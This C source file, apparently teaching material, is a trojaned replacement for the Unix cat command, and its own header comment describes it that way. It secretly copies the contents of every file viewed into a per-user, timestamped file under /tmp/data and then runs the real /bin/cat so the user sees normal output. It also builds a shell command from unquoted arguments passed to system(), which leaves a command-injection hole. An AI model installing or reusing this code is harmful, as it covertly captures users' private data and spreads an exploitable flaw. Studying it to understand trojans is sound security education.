#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* Author: Lyn Turbak
 * Date: 2016/03/07
 * Improved trojaned version of the cat program that 
 *   (1) first copies cat output to a file with name /tmp/data/<username>-<datetime>
 *   (2) Then performs real cat via /bin/cat <arg1> ... <argn> // end with real cat!
 * This version avoids the "doubling explosion" of previous version, in which 
 * cat on the single carnivore file double the size of the file. 
 */

int main (int argn, char* argv[], char* arge[]) {
  char timeBuff[120]; // buffer for date/time
  char writeToFileName[1024]; // buffer for creating string that redirects to filename
  char command[1024]; // buffer for command
  int i; 

  // Create date/time string
  time_t now = time (0);
  strftime(timeBuff, 120, "%Y-%m-%d-%H-%M-%S", localtime (&now));
  // printf("datetime=%s\n", timeBuff);

  // Build string of form "> /tmp/data/<username>-<datetime>": 
  char* redirectionStart = "> /tmp/data/";
  char* userName = getenv("USER");
  snprintf(writeToFileName, 
	   strlen(redirectionStart) +  strlen(userName) + 1 + strlen(timeBuff) + 1,
           // extra + 1 at end for null char
	   "%s%s-%s", redirectionStart, userName, timeBuff);
  // printf("writeToFileName=%s\n", writeToFileName);

  // Build cat command for saving user data in /tmp/data/<username>-<datetime>: 
  // /bin/cat argv[1] ... argv[n] > /tmp/data/<username>-<datetime>
  char* catCommand = "/bin/cat "; // note space at end
  int charsRemaining = 1024;
  strncpy(command, catCommand, strlen(catCommand) + 1); // + 1 for null char
  charsRemaining -= strlen(catCommand); 
  for (i = 1; i < argn; i++) {
    charsRemaining -= strlen(argv[i]); 
    if (charsRemaining < 0) break;
    strncat(command, argv[i], strlen(argv[i])); 
    charsRemaining -= 1;
    if (charsRemaining < 0) break;
    strncat(command, " ", 1);
  }
  charsRemaining -= (strlen(writeToFileName) + 1); // + 1 for terminating null char
  if (charsRemaining > 0) {
    strncat(command, writeToFileName, strlen(writeToFileName) + 1);
    // printf("command=%s\n", command);
    system(command); // Perform /bin/cat argv[1] ... argv[n] > /tmp/data/<username>-<datetime>
  }

  // Finally execute original command, using /bin/cat for argv[0]
  argv[0] = "/bin/cat";
  execve(argv[0], argv, arge); // end with real cat!
}
